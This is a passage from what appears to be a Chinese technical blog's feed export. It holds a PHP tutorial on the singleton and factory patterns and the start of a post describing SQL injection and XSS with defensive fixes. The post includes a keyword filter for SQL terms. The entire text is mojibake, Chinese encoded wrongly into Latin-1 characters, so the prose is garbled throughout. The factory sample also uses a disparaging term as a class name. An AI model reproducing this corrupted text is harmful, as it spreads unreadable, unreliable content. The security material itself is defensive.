·çš„é—®é¢˜ï¼šæ•°æ®åº“è¿æ¥èµ„æºä¸€ä¸ªç”¨æˆ·ä¸€ä¸ªè¿æ¥å°±å¤Ÿäº†ï¼Œæ‰€ä»¥ä¸Šè¿°æ–¹æ¡ˆå¯ä»¥ä½œä¸ºä¸€ç§ç±»ä¼¼é—®é¢˜çš„é€šç”¨è§£å†³æ–¹æ¡ˆï¼Œæ­¤æ—¶å°±å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªè®¾è®¡æ¨¡å¼</li></ul><blockquote><p>å°ç»“</p></blockquote><p>1ã€è®¾è®¡æ¨¡å¼æ˜¯ä¸€ç±»é—®é¢˜çš„é€šç”¨è§£å†³æ–¹æ¡ˆ</p><p>2ã€è®¾è®¡æ¨¡å¼çš„å­˜åœ¨ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿçš„è§£å†³æŸç±»ç‰¹å®šéœ€æ±‚é—®é¢˜</p><p>3ã€é€šå¸¸è®¾è®¡æ¨¡å¼çš„å‡ºç°ï¼Œéƒ½ä¼šéœ€è¦é¢å¤–å¢åŠ å¼€å‘éš¾åº¦å’Œå¼€å‘æ—¶é—´ï¼Œå› æ­¤æˆ‘ä»¬è¦æ ¹æ®é¡¹ç›®çš„éœ€æ±‚æ¥é€‰æ‹©</p><h2 id="1ã€å•ä¾‹æ¨¡å¼"><a href="#1ã€å•ä¾‹æ¨¡å¼" class="headerlink" title="1ã€å•ä¾‹æ¨¡å¼"></a><strong>1ã€å•ä¾‹æ¨¡å¼</strong></h2><blockquote><p>ç›®æ ‡ï¼šç†è§£å•ä¾‹æ¨¡å¼çš„æ¦‚å¿µï¼ŒæŒæ¡å•ä¾‹æ¨¡å¼è§£å†³æ–¹æ¡ˆ</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>å•ä¾‹æ¨¡å¼</strong>ï¼šsingletonï¼Œæ˜¯ä¸€ç§ç±»çš„è®¾è®¡åªä¼šæœ€å¤šäº§ç”Ÿä¸€ä¸ªå¯¹è±¡çš„è®¾è®¡æ€æƒ³</p><ul><li>å•ä¾‹æ¨¡å¼çš„ç±»åªèƒ½åœ¨ä¸€æ¬¡è¿è¡Œä¸­äº§ç”Ÿä¸€ä¸ªå¯¹è±¡</li><li>å•ä¾‹æ¨¡å¼ä¸ºäº†è§£å†³å¦‚ä½•åªäº§ç”Ÿä¸€ä¸ªå¯¹è±¡ï¼Œéœ€è¦ä½¿ç”¨ä»¥ä¸‹è§£å†³æ–¹æ¡ˆï¼Œç®€ç§°<code>ä¸‰ç§ä¸€å…¬</code>ï¼š<ul><li><strong>ç§æœ‰åŒ–æ„é€ æ–¹æ³•</strong>ï¼šä¸è®©åœ¨å¤–éƒ¨äº§ç”Ÿå¤šä¸ªå¯¹è±¡</li><li><strong>ç§æœ‰åŒ–å…‹éš†æ–¹æ³•</strong>ï¼šä¸å…è®¸å¯¹è±¡è¢«å…‹éš†äº§ç”Ÿæ–°å¯¹è±¡</li><li><strong>å…¬æœ‰åŒ–é™æ€æ–¹æ³•</strong>ï¼šè¿è¡Œè¿›å…¥ç±»å†…éƒ¨äº§ç”Ÿå¯¹è±¡</li><li><strong>ç§æœ‰åŒ–é™æ€å±æ€§</strong>ï¼šä¿å­˜å·²ç»äº§ç”Ÿçš„å¯¹è±¡</li></ul></li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€å®šä¹‰ç©ºç±»</p><p>2ã€æœç»èƒ½å¤Ÿäº§ç”Ÿå¤šä¸ªå¯¹è±¡çš„æ–¹å¼ï¼šæ„é€ æ–¹æ³•ç§æœ‰åŒ–</p><p>3ã€æƒ³åŠæ³•äº§ç”Ÿå¯¹è±¡ï¼šè¿›å…¥ç±»å†…éƒ¨äº§ç”Ÿå¯¹è±¡</p><p>4ã€æƒ³åŠæ³•æ§åˆ¶å†…éƒ¨å¯¹è±¡ç”Ÿäº§ï¼šåªç”Ÿäº§ä¸€ä¸ª</p><p>5ã€æœç»å¤–éƒ¨æ‹¿ç€å·²æœ‰å¯¹è±¡äº§ç”Ÿæ–°å¯¹è±¡ï¼šå…‹éš†æ–¹æ³•ç§æœ‰åŒ–</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€é¦–å…ˆå®šä¹‰ä¸€ä¸ªç©ºç±»ï¼Œå«åšSingleton</p><pre><code># åˆ›å»ºä¸€ä¸ªç©ºç±»class Singleton{}</code></pre><p>2ã€å¯¹è±¡çš„äº§ç”Ÿæ˜¯é€šè¿‡å®ä¾‹åŒ–äº§ç”Ÿçš„ï¼Œè€Œå®ä¾‹åŒ–æ˜¯ä¸€ç§ä¸å¯æ§è¡Œä¸ºï¼Œå³å¯ä»¥äº§ç”Ÿæ— é™å¤šä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥åº”è¯¥ç¦æ­¢ï¼šå³â€ç¦æ­¢å®ä¾‹åŒ–â€œï¼Œä¹‹æ‰€ä»¥æ˜¯å¼•å·ï¼Œæ˜¯å› ä¸ºåªèƒ½ç¦æ­¢åœ¨ç±»å¤–éƒ¨å®ä¾‹åŒ–å¯¹è±¡ï¼Œç§æœ‰åŒ–æ„é€ æ–¹æ³•</p><pre><code># åœ¨ä¸Šè¿°ç±»ä¸­å¢åŠ ç§æœ‰åŒ–æ„é€ æ–¹æ³•class Singleton{   private function __construct(){} }# å°è¯•å¤–éƒ¨å®ä¾‹åŒ–$s = new Singleton();                # è‡´å‘½é”™è¯¯ï¼šä¸èƒ½è®¿é—®ç§æœ‰æ–¹æ³•</code></pre><p>3ã€ä¸€æ—¦å¤–éƒ¨ä¸èƒ½å®ä¾‹åŒ–å¯¹è±¡äº†ï¼Œé‚£å°±æ„å‘³ç€æ ¹æœ¬â€œä¸å¯èƒ½â€äº§ç”Ÿå¯¹è±¡äº†ï¼Œæ­¤æ—¶å°±åªèƒ½æƒ³åŠæ³•åœ¨è¿˜æ²¡æœ‰äº§ç”Ÿå¯¹è±¡çš„æ—¶å€™å°±è¿›å…¥åˆ°â€œç±»å†…éƒ¨â€ï¼Œæ„å‘³ç€åªèƒ½é€šè¿‡<code>é™æ€æ–¹æ³•</code>è®©ç±»ç›´æ¥è¿›å…¥åˆ°ç±»çš„å†…éƒ¨</p><pre><code># åœ¨ä¸Šè¿°ç±»ä¸­å¢åŠ å…¬æœ‰é™æ€æ–¹æ³•public static function getInstance(){}</code></pre><p>4ã€è¿›å…¥ç±»çš„å†…éƒ¨ä¾ç„¶è¿˜æ˜¯æ²¡æœ‰å¯¹è±¡ï¼Œæ­¤æ—¶éœ€è¦åœ¨é™æ€æ–¹æ³•å†…éƒ¨è¿›è¡Œå¯¹è±¡å®ä¾‹åŒ–ï¼Œå¹¶ä¸”æŠŠå¾—åˆ°çš„å¯¹è±¡è¿”å›åˆ°å¤–éƒ¨</p><pre><code># ä¿®æ”¹å…¬æœ‰é™æ€æ–¹æ³•ï¼šè·å–å¯¹è±¡ï¼Œå¹¶è¿”å›ç»™å¤–éƒ¨è°ƒç”¨å‡ºpublic static function getInstance(){    return new self();}# å¤–éƒ¨è·å–å¯¹è±¡$s = Singleton::getInstance();</code></pre><p>5ã€æ­¤æ–¹æ³•å¼€å¯äº†å®ä¾‹åŒ–å¯¹è±¡çš„çª—å£ï¼Œä½†æ˜¯æ­¤æ—¶æ–°é—®é¢˜å‡ºç°ï¼šæ— é™è°ƒç”¨é™æ€æ–¹æ³•ä¾ç„¶å¯ä»¥å¾—åˆ°å¤šä¸ªå¯¹è±¡ã€‚å¦‚æœæƒ³è¦è¯¥æ–¹æ³•åªè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œå°±å¾—ä¿è¯ç±»å†…éƒ¨æœ‰åŠæ³•å­˜ç€æŸä¸ªäº§ç”Ÿçš„å¯¹è±¡ï¼Œç¬¬ä¸€æ¬¡äº§ç”Ÿæ–°çš„ï¼Œåé¢è¿”å›æ—§çš„ã€‚æ­¤æ—¶éœ€è¦ä½¿ç”¨é™æ€å±æ€§</p><pre><code># å¢åŠ é™æ€å±æ€§ï¼šç§æœ‰ï¼Œä¸å…è®¸å¤–éƒ¨ä¿®æ”¹ï¼Œå¦åˆ™å¤–éƒ¨ä¿®æ”¹ä¹‹åå°±æ²¡æœ‰æ„ä¹‰äº†private static $object = NULL;        # åˆå§‹åŒ–ä¸ºNULLï¼Œæ²¡æœ‰å¯¹è±¡# ä¿®æ”¹é™æ€æ–¹æ³•public static function getInstance(){    # åˆ¤æ–­å†…éƒ¨å±æ€§æ˜¯å¦å­˜åœ¨å¯¹è±¡ï¼ˆis_objectå‡½æ•°ï¼‰ï¼šæœ€å¥½çš„åˆ¤å®šæ˜¯å­˜çš„å¯¹è±¡æ˜¯å½“å‰ç±»çš„ instanceof    if(!(self::$object instanceof self)){        # å½“å‰ä¿å­˜çš„å†…å®¹ä¸æ˜¯å½“å‰ç±»çš„å¯¹è±¡        self::$object = new self();    }    # è¿”å›å¯¹è±¡ç»™å¤–éƒ¨    return self::$object;}</code></pre><p>â€‹    </p><p>6ã€æ­¤æ—¶å¯ä»¥ä¿è¯å¤–éƒ¨æ— è®ºå¤šå°‘æ¬¡è°ƒç”¨å…¬æœ‰é™æ€æ–¹æ³•è·å–å®ä¾‹ï¼Œéƒ½ä¼šåªå¾—åˆ°ä¸€ä¸ªå¯¹è±¡ã€‚ä½†æ˜¯æ­¤æ—¶å¤–éƒ¨å¯¹è±¡ä¾ç„¶å¯ä»¥äº§ç”Ÿæ–°çš„å¯¹è±¡ï¼šå› ä¸ºå…‹éš†ï¼Œæ‰€ä»¥è¿˜å¿…é¡»ç¦æ­¢å¯¹è±¡çš„å…‹éš†ï¼Œå³åœ¨ç±»å†…éƒ¨ç§æœ‰åŒ–å…‹éš†æ–¹æ³•</p><pre><code># åœ¨Singletonç±»ä¸­å¢åŠ ç§æœ‰åŒ–çš„__clone()æ–¹æ³•private function __clone(){}</code></pre><blockquote><p><strong>æ€»ç»“</strong></p></blockquote><p>1ã€å•ä¾‹æ¨¡å¼å°±æ˜¯è®¾è®¡çš„ç±»æœ€å¤šåªèƒ½å¾—åˆ°ä¸€ä¸ªå¯¹è±¡</p><p>2ã€å•ä¾‹æ¨¡å¼çš„è®¾è®¡è§„èŒƒå°±æ˜¯â€œä¸‰ç§ä¸€å…¬â€</p><ul><li>ç§æœ‰åŒ–æ„é€ æ–¹æ³•ï¼šç¦æ­¢åœ¨ç±»å¤–æ— é™å®ä¾‹åŒ–å¯¹è±¡</li><li>ç§æœ‰åŒ–å…‹éš†æ–¹æ³•ï¼šç¦æ­¢å¯¹è±¡æ— é™å…‹éš†å¯¹è±¡</li><li>ç§æœ‰åŒ–é™æ€å±æ€§ï¼šä¿å­˜ç±»å†…éƒ¨å®ä¾‹åŒ–å¾—åˆ°çš„å¯¹è±¡</li><li>å…¬æœ‰åŒ–é™æ€æ–¹æ³•ï¼šå…è®¸å¤–éƒ¨é€šè¿‡è°ƒç”¨ç±»å†…éƒ¨æ–¹æ³•è·å–å¯¹è±¡</li></ul><p>3ã€å•ä¾‹æ¨¡å¼åªæ˜¯è§£å†³å½“å‰ç±»å¯¹è±¡çš„å”¯ä¸€æ€§ï¼Œå¦‚æœè¿˜æœ‰å…¶ä»–åŠŸèƒ½è¯‰æ±‚ï¼Œå¯ä»¥åœ¨ç±»ä¸­å¢åŠ ç›¸åº”çš„å…¶ä»–ç±»æˆå‘˜</p><p>4ã€å•ä¾‹æ¨¡å¼çš„ç›®çš„æ˜¯ä¸ºäº†ä¿æŠ¤èµ„æºçš„å”¯ä¸€æ€§</p><h2 id="2ã€å·¥å‚æ¨¡å¼"><a href="#2ã€å·¥å‚æ¨¡å¼" class="headerlink" title="2ã€å·¥å‚æ¨¡å¼"></a><strong>2ã€å·¥å‚æ¨¡å¼</strong></h2><blockquote><p>ç›®æ ‡ï¼šç†è§£å·¥å‚æ¨¡å¼çš„æ¦‚å¿µï¼ŒæŒæ¡å·¥å‚æ¨¡å¼è§£å†³æ–¹æ¡ˆ</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>å·¥å‚æ¨¡å¼</strong>ï¼šfactoryï¼Œæ˜¯æŒ‡åƒå·¥å‚ä¸€æ ·æµæ°´çº¿ç”Ÿäº§å¯¹è±¡ï¼Œç”±ä¸€ä¸ªåœ°æ–¹ç”Ÿäº§å¯¹è±¡ï¼Œå…¶ä»–ä½ç½®å°±ä¸éœ€è¦é¢å¤–å®ä¾‹åŒ–å¯¹è±¡ï¼Œä»è€Œå¯ä»¥æ–¹ä¾¿åæœŸä»£ç ç»Ÿä¸€çš„ç»´æŠ¤</p><ul><li><p>å·¥å‚æ¨¡å¼æ˜¯ç”¨æ¥ä»£ç”Ÿäº§å¯¹è±¡</p></li><li><p>å·¥å‚æ¨¡å¼ä¸‹å¯ä»¥æ–¹ä¾¿éšè—çœŸå®çš„ç±»ç»“æ„ï¼Œå› æ­¤ä¹Ÿæ›´åŠ å®‰å…¨</p></li><li><p>å·¥å‚æ¨¡å¼ä¸éœ€è¦å…³æ³¨å·¥å‚æ˜¯å¦‚ä½•äº§ç”Ÿå¯¹è±¡ï¼Œåªéœ€è¦è®©å·¥å‚äº§ç”Ÿå¯¹è±¡</p></li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€åˆ›å»ºä¸åŒç±»</p><p>2ã€åˆ›å»ºç”Ÿäº§å¯¹è±¡çš„å·¥å‚ç±»</p><p>3ã€è°ƒç”¨å·¥å‚ç±»äº§ç”Ÿå¯¹è±¡</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€å·¥å‚æ¨¡å¼é’ˆå¯¹çš„æ˜¯â€œç›¸åŒæ¨¡å‹â€çš„ç»Ÿä¸€äº§å‡ºï¼Œå³ä½¿ç”¨å·¥å‚æ¨¡å¼äº§å‡ºå¯¹è±¡å¯¹åº”çš„ç±»éƒ½æœ‰ç›¸åŒçš„ç»“æ„æˆ–è€…åŠŸèƒ½ã€‚æ‰€ä»¥ï¼Œé¦–å…ˆè¦æœ‰ä¸€æ‰¹å…·æœ‰ç±»ä¼¼åŠŸèƒ½çš„ç±»ï¼ˆå…¶å®æœ¬è´¨æ˜¯åŒæ ·çš„å¤§ç±»ä¸‹çš„å°ç±»ï¼‰</p><pre><code># ä¸‰ä¸ªç±»æ–‡ä»¶# äººæ˜¯ä¸€ç§å¤§ç±»ï¼Œäººä¸‹åº”è¯¥æœ‰ç”·äººã€å¥³äººã€äººå¦–ï¼Œå„è‡ªæˆç±»class Man{    public function display(){        echo &apos;è¿™æ˜¯ç”·äºº&lt;br/&gt;&apos;;    }    }class Woman{    public function display(){        echo &apos;è¿™æ˜¯å¥³äºº&lt;br/&gt;&apos;;    }}class Ladyboy{    public function display(){        echo &apos;è¿™æ˜¯äººå¦–&lt;br/&gt;&apos;;    }}</code></pre><p>â€‹    </p><p>2ã€ä½¿ç”¨å·¥å‚æ¨¡å¼ï¼Œå°±éœ€è¦å¢åŠ ä¸€ä¸ªå·¥å‚ç±»ï¼šHumanFactory</p><pre><code># äººç±»å·¥å‚class HumanFactory{    public function getInstance($classname){        return new $classname();                # å¯å˜å˜é‡ä½¿ç”¨    }    }$hf = new HumanFactory();$m = $hf-&gt;getInstance(&apos;Man&apos;);$m-&gt;display();                                    # è¿™æ˜¯ç”·äºº$w = $hf-&gt;getInstance(&apos;Woman&apos;);$w-&gt;display();                                    # è¿™æ˜¯å¥³äºº</code></pre><p>3ã€ä¸Šè¿°å·¥å‚ç±»åœ¨å¯¹è±¡ç”Ÿäº§çš„æ—¶å€™ï¼Œé¢å¤–äº§ç”Ÿäº†ä¸€ä¸ªå·¥å‚ç±»çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ— å®é™…å«ä¹‰ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨æ›´ä¼˜çš„æ–¹å¼æ¥ç”Ÿäº§å¯¹è±¡ï¼šé™æ€å·¥å‚</p><pre><code># é™æ€äººç±»å·¥å‚class HumanFactory{    public static function getInstance($classname){        return new $classname();                # å¯å˜å˜é‡ä½¿ç”¨    }    }$m = HumanFactory::getInstance(&apos;Man&apos;);$m-&gt;display();                                    # è¿™æ˜¯ç”·äºº$w = HumanFactory::getInstance(&apos;Woman&apos;);$w-&gt;display();                                    # è¿™æ˜¯å¥³äºº</code></pre><p>4ã€ä»¥ä¸Šæ¨¡å¼è™½ç„¶ä¹Ÿæ˜¯å·¥å‚ç”Ÿäº§å¯¹è±¡ï¼Œä½†æ˜¯æ˜¯å»ºç«‹åœ¨ä½¿ç”¨è€…çŸ¥é“ç±»åçš„å‰æä¸‹ï¼Œè€Œä¸”å¦‚æœåŸç±»åä¿®æ”¹ï¼Œä¾ç„¶éœ€è¦å¤šå¤„ä¿®æ”¹ä»£ç ï¼Œæ‰€ä»¥æ²¡æœ‰è¾¾åˆ°å·¥å‚æ¨¡å¼çš„çœŸå®ç›®çš„ã€‚ä¿®æ”¹å·¥å‚æ¨¡å¼</p><pre><code># é™æ€äººç±»å·¥å‚class HumanFactory{    public static function getInstance($flag){        # flagåªæ˜¯ä¸€ç§æ ‡å¿—ï¼šä¸æ˜¯ç±»å        # $flagå¯ä»¥æ˜¯mä»£è¡¨Manï¼Œwä»£è¡¨Womanï¼ŒLä»£è¡¨Ladyboy        switch($flag){            case &apos;m&apos;:                return new Man();            case &apos;w&apos;:                return new Woman();            case &apos;L&apos;:                return new Ladyboy();            default:                return null;            # åŒ¹é…å¤±è´¥ï¼Œè¿”å›ç©º        }                }    }$m = HumanFactory::getInstance(&apos;m&apos;);$m-&gt;display();                                    # è¿™æ˜¯ç”·äºº$w = HumanFactory::getInstance(&apos;w&apos;);$w-&gt;display();                                    # è¿™æ˜¯å¥³äºº</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€å·¥å‚æ¨¡å¼æ˜¯ä¸€ç§æŒ‰éœ€ç”Ÿäº§å¯¹è±¡çš„æ¨¡å¼ï¼ˆä¸€ä¸ªå·¥å‚ç”Ÿäº§çš„å¯¹è±¡åº”è¯¥ç›¸ä¼¼ï¼‰</p><p>2ã€å·¥å‚æ¨¡å¼é€šå¸¸æ˜¯éœ€è¦åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œä¼šå‡ºç°å¾ˆå¤šçš„ç›¸åŒåŠŸèƒ½çš„ç±»ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨å·¥å‚äº§ç”Ÿå¯¹è±¡</p><p>3ã€å·¥å‚æ¨¡å¼çš„ä¼˜ç‚¹æ˜¯èƒ½å¤Ÿæ–¹ä¾¿åæœŸå¯¹ç±»çš„ç»´æŠ¤ï¼ˆæ›´åï¼‰</p><p>4ã€å·¥å‚æ¨¡å¼çš„ç¼ºç‚¹æ˜¯éšç€åŠŸèƒ½å¢åŠ ï¼Œä¼šéœ€è¦å¢åŠ å¾ˆå¤šå¼€å‘é‡ï¼ˆå¼€å‘å¤šä¸ªå·¥å‚ï¼‰ï¼šä»¥ä¸Šåªæ˜¯ä¸€ç§ç®€å•å·¥å‚æ¨¡å¼ï¼Œå¤æ‚çš„å·¥å‚æ¨¡å¼ä¼šæœ‰ä¸åŒçš„å·¥å‚ï¼Œè°ƒç”¨æ—¶éœ€è¦ä½¿ç”¨ä¸åŒå·¥å‚æ¥å®ç°å¯¹è±¡ç”Ÿäº§</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Webå¸¸è§æ¼æ´æè¿°åŠä¿®å¤å»ºè®®</title>
      <link href="/2021/07/23/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/"/>
      <url>/2021/07/23/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="Webå¸¸è§æ¼æ´æè¿°åŠä¿®å¤å»ºè®®"><a href="#Webå¸¸è§æ¼æ´æè¿°åŠä¿®å¤å»ºè®®" class="headerlink" title="Webå¸¸è§æ¼æ´æè¿°åŠä¿®å¤å»ºè®®"></a>Webå¸¸è§æ¼æ´æè¿°åŠä¿®å¤å»ºè®®</h2><h2 id="1-SQLæ³¨å…¥"><a href="#1-SQLæ³¨å…¥" class="headerlink" title="1.SQLæ³¨å…¥"></a>1.SQLæ³¨å…¥</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€Webç¨‹åºä¸­å¯¹äºç”¨æˆ·æäº¤çš„å‚æ•°æœªåšè¿‡æ»¤ç›´æ¥æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­æ‰§è¡Œï¼Œå¯¼è‡´å‚æ•°ä¸­çš„ç‰¹æ®Šå­—ç¬¦ç ´åäº†SQLè¯­å¥åŸæœ‰é€»è¾‘ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„SQLè¯­å¥ï¼Œå¦‚æŸ¥è¯¢æ•°æ®ã€ä¸‹è½½æ•°æ®ã€å†™å…¥webshellã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ä»¥åŠç»•è¿‡ç™»å½•é™åˆ¶ç­‰ã€‚</p><p>ã€€ã€€<strong>ä¿®å¤å»ºè®®</strong></p><p>ä»£ç å±‚æœ€ä½³é˜²å¾¡sqlæ¼æ´æ–¹æ¡ˆï¼šä½¿ç”¨é¢„ç¼–è¯‘sqlè¯­å¥æŸ¥è¯¢å’Œç»‘å®šå˜é‡ã€‚</p><p>ã€€ã€€ï¼ˆ1ï¼‰ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼Œä½¿ç”¨PDOéœ€è¦æ³¨æ„ä¸è¦å°†å˜é‡ç›´æ¥æ‹¼æ¥åˆ°PDOè¯­å¥ä¸­ã€‚æ‰€æœ‰çš„æŸ¥è¯¢è¯­å¥éƒ½ä½¿ç”¨æ•°æ®åº“æä¾›çš„å‚æ•°åŒ–æŸ¥è¯¢æ¥å£ï¼Œå‚æ•°åŒ–çš„è¯­å¥ä½¿ç”¨å‚æ•°è€Œä¸æ˜¯å°†ç”¨æˆ·è¾“å…¥å˜é‡åµŒå…¥åˆ°SQLè¯­å¥ä¸­ã€‚å½“å‰å‡ ä¹æ‰€æœ‰çš„æ•°æ®åº“ç³»ç»Ÿéƒ½æä¾›äº†å‚æ•°åŒ–SQLè¯­å¥æ‰§è¡Œæ¥å£ï¼Œä½¿ç”¨æ­¤æ¥å£å¯ä»¥éå¸¸æœ‰æ•ˆçš„é˜²æ­¢SQLæ³¨å…¥æ”»å‡»ã€‚</p><p>ã€€ã€€ï¼ˆ2ï¼‰å¯¹è¿›å…¥æ•°æ®åº“çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆâ€™â€&lt;&gt;&amp;*;ç­‰ï¼‰è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œæˆ–ç¼–ç è½¬æ¢ã€‚</p><p>ã€€ã€€ï¼ˆ3ï¼‰ç¡®è®¤æ¯ç§æ•°æ®çš„ç±»å‹ï¼Œæ¯”å¦‚æ•°å­—å‹çš„æ•°æ®å°±å¿…é¡»æ˜¯æ•°å­—ï¼Œæ•°æ®åº“ä¸­çš„å­˜å‚¨å­—æ®µå¿…é¡»å¯¹åº”ä¸ºintå‹ã€‚</p><p>ã€€ã€€ï¼ˆ4ï¼‰æ•°æ®é•¿åº¦åº”è¯¥ä¸¥æ ¼è§„å®šï¼Œèƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢æ¯”è¾ƒé•¿çš„SQLæ³¨å…¥è¯­å¥æ— æ³•æ­£ç¡®æ‰§è¡Œã€‚</p><p>ã€€ã€€ï¼ˆ5ï¼‰ç½‘ç«™æ¯ä¸ªæ•°æ®å±‚çš„ç¼–ç ç»Ÿä¸€ï¼Œå»ºè®®å…¨éƒ¨ä½¿ç”¨UTF-8ç¼–ç ï¼Œä¸Šä¸‹å±‚ç¼–ç ä¸ä¸€è‡´æœ‰å¯èƒ½å¯¼è‡´ä¸€äº›è¿‡æ»¤æ¨¡å‹è¢«ç»•è¿‡ã€‚</p><p>ã€€ã€€ï¼ˆ6ï¼‰ä¸¥æ ¼é™åˆ¶ç½‘ç«™ç”¨æˆ·çš„æ•°æ®åº“çš„æ“ä½œæƒé™ï¼Œç»™æ­¤ç”¨æˆ·æä¾›ä»…ä»…èƒ½å¤Ÿæ»¡è¶³å…¶å·¥ä½œçš„æƒé™ï¼Œä»è€Œæœ€å¤§é™åº¦çš„å‡å°‘æ³¨å…¥æ”»å‡»å¯¹æ•°æ®åº“çš„å±å®³ã€‚</p><p>ã€€ã€€ï¼ˆ7ï¼‰é¿å…ç½‘ç«™æ˜¾ç¤ºSQLé”™è¯¯ä¿¡æ¯ï¼Œæ¯”å¦‚ç±»å‹é”™è¯¯ã€å­—æ®µä¸åŒ¹é…ç­‰ï¼Œé˜²æ­¢æ”»å‡»è€…åˆ©ç”¨è¿™äº›é”™è¯¯ä¿¡æ¯è¿›è¡Œä¸€äº›åˆ¤æ–­ã€‚</p><p>ã€€ã€€ï¼ˆ8ï¼‰è¿‡æ»¤å±é™©å­—ç¬¦ï¼Œä¾‹å¦‚ï¼šé‡‡ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…unionã€sleepã€andã€selectã€load_fileç­‰å…³é”®å­—ï¼Œå¦‚æœåŒ¹é…åˆ°åˆ™ç»ˆæ­¢è¿è¡Œã€‚</p><h2 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h2><p>ã€€ã€€<strong>æ¼æ´æè¿°</strong></p><p>ã€€ã€€1ã€Webç¨‹åºä»£ç ä¸­å¯¹ç”¨æˆ·æäº¤çš„å‚æ•°æœªåšè¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œå¯¼è‡´å‚æ•°ä¸­çš„ç‰¹æ®Šå­—ç¬¦ç ´åäº†HTMLé¡µé¢çš„åŸæœ‰é€»è¾‘ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œæ¶æ„HTML/JSä»£ç ã€æ„é€ è •è™«ã€ç¯¡æ”¹é¡µé¢å®æ–½é’“é±¼æ”»å‡»ã€ä»¥åŠè¯±å¯¼ç”¨æˆ·å†æ¬¡ç™»å½•ï¼Œç„¶åè·å–å…¶ç™»å½•å‡­è¯ç­‰ã€‚</p><p>ã€€ã€€2ã€XSSæ”»å‡»å¯¹WebæœåŠ¡å™¨æœ¬èº«è™½æ— ç›´æ¥å±å®³ï¼Œä½†æ˜¯å®ƒå€ŸåŠ©ç½‘ç«™è¿›è¡Œä¼ æ’­ï¼Œå¯¹ç½‘ç«™ç”¨æˆ·è¿›è¡Œæ”»å‡»ï¼Œçªƒå–ç½‘ç«™ç”¨æˆ·è´¦å·èº«ä»½ä¿¡æ¯ç­‰ï¼Œä»è€Œä¹Ÿä¼šå¯¹ç½‘ç«™äº§ç”Ÿè¾ƒä¸¥é‡çš„å¨èƒã€‚</p><p>XSSæ”»å‡»å¯å¯¼è‡´ä»¥ä¸‹å±å®³ï¼š</p><p>ã€€ã€€1ã€é’“é±¼æ¬ºéª—ï¼šæœ€å…¸å‹çš„å°±æ˜¯åˆ©ç”¨ç›®æ ‡ç½‘ç«™çš„åå°„å‹è·¨ç«™è„šæœ¬æ¼æ´å°†ç›®æ ‡ç½‘ç«™é‡å®šå‘åˆ°é’“é±¼ç½‘ç«™ï¼Œæˆ–è€…é€šè¿‡æ³¨å…¥é’“é±¼JavaScriptè„šæœ¬ä»¥ç›‘æ§ç›®æ ‡ç½‘ç«™çš„è¡¨å•è¾“å…¥ï¼Œç”šè‡³æ”»å‡»è€…åŸºäºDHTMLæŠ€æœ¯å‘èµ·æ›´é«˜çº§çš„é’“é±¼æ”»å‡»ã€‚</p><p>ã€€ã€€2ã€ç½‘ç«™æŒ‚é©¬ï¼šè·¨ç«™æ—¶ï¼Œæ”»å‡»è€…åˆ©ç”¨Iframeæ ‡ç­¾åµŒå…¥éšè—çš„æ¶æ„ç½‘ç«™ï¼Œå°†è¢«æ”»å‡»è€…å®šå‘åˆ°æ¶æ„ç½‘ç«™ä¸Šã€æˆ–å¼¹å‡ºæ¶æ„ç½‘ç«™çª—å£ç­‰æ–¹å¼ï¼Œè¿›è¡ŒæŒ‚é©¬ã€‚</p><p>ã€€ã€€3ã€èº«ä»½ç›—ç”¨ï¼šCookieæ˜¯ç”¨æˆ·å¯¹äºç‰¹å®šç½‘ç«™çš„èº«ä»½éªŒè¯æ 